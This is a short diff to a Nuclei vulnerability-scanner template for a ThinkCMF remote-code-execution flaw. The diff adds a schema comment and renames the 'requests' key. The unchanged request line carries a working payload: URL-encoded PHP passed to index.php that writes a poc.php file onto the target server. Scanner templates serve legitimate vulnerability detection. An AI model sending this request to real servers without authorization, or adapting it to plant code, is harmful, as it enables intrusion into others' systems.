@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: thinkcmf-rce
 info:
   name: ThinkCMF RCE
@@ -5,7 +6,7 @@ info:
   severity: critical
   reference: https://www.freebuf.com/vuls/217586.html
   tags: thinkcmf,rce
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/index.php?a=fetch&content=%3C?php+file_put_contents(%22poc.php%22,%22%3C?php+echo+phpinfo()%3B%22)%3B"
